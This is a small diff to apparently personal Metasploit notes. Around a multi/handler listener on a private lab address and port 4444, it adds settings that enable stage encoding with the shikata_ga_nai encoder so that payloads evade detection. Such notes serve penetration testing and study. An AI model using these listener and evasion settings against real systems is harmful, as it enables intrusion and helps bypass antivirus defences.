@@ -39,3 +39,8 @@ set lhost 192.168.199.128
 set lport 4444
 run
 ```
+###### multi/handler payload encode
+```
+set EnableStageEncoding true
+set StageEncoder x86/shikata_ga_nai
+```
